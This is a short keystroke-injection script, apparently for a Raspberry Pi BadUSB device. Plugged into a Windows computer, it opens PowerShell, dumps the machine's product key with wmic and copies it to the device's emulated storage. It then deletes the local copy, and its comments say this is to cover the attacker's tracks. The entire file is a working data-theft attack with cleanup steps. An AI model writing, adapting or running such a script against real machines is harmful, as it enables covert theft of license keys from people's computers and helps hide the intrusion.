layout('us'); // Keyboard layout
typingSpeed(20,0) // Typing speed, random speed +/-
delay(1000) // Initial delay for use with the TriggerActions templates
press("GUI r")
delay(1000)
type("powershell\n") // Going into powershell to run the more versatile commands
delay(10000) // Looong delay, powershell sometimes takes a bit to boot
type("wmic path softwarelicensingservice get OA3xOriginalProductKey > productkey.txt\n") // The actual command to display the PK
delay(3000)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'USB6624' } | select name\n") //USB6624 is the name of the emulated storage
// Basically just finds and copies to the Pi, check out Seytronic's video on the A.L.O.A
type("copy productkey.txt $usbpath.name\n")
delay(100)
type("del /f productkey.txt \n") // Deletes the .txt from the target's computer to cover one's tracks
delay(100)
type("exit\n") // Aaaand scene!
